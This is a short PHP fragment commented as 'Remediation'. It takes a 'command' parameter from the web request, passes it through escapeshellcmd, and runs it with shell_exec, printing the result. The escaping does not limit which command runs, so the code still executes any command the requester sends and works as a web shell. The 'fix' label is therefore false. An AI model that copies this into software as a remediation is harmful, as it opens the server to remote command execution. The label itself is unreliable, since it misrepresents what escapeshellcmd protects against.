<?php 
// Remediation
$command = $_REQUEST['command'];
$command = escapeshellcmd($command);
echo shell_exec($command);
?> 
